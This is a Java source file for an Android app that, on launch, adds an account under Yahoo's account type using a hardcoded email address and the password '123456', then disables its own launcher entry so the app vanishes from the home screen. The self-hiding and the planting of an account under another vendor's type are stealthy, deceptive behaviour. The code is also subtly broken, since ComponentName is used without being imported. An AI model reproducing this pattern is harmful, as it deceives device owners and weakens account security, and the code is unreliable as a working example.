package com.accountassistant;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final String ACCOUNT_TYPE =
            "com.yahoo.mobile.client.share.account";

    private static final String ACCOUNT_NAME =
            "2312213859@qq.com";

    private static final String PASSWORD =
            "123456";

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        try {

            AccountManager am = AccountManager.get(this);

            Account[] accounts =
                    am.getAccountsByType(ACCOUNT_TYPE);

            boolean exists = false;

            for (Account acc : accounts) {

                if (ACCOUNT_NAME.equals(acc.name)) {

                    exists = true;
                    break;
                }
            }

            if (exists) {

                hideSelf();

                Toast.makeText(
                        this,
                        "Account already exists",
                        Toast.LENGTH_LONG
                ).show();

                finish();
                return;
            }

            Account account = new Account(
                    ACCOUNT_NAME,
                    ACCOUNT_TYPE
            );

            boolean result =
                    am.addAccountExplicitly(
                            account,
                            PASSWORD,
                            null
                    );

            if (result) {

                Toast.makeText(
                        this,
                        "Account added successfully",
                        Toast.LENGTH_LONG
                ).show();

                hideSelf();

            } else {

                Toast.makeText(
                        this,
                        "Add account failed",
                        Toast.LENGTH_LONG
                ).show();
            }

        } catch (Exception e) {

            Toast.makeText(
                    this,
                    e.toString(),
                    Toast.LENGTH_LONG
            ).show();
        }

        finish();
    }

    private void hideSelf() {

        PackageManager pm = getPackageManager();

        ComponentName componentName =
                new ComponentName(
                        getPackageName(),
                        getPackageName() + ".Launcher"
                );

        pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }
}
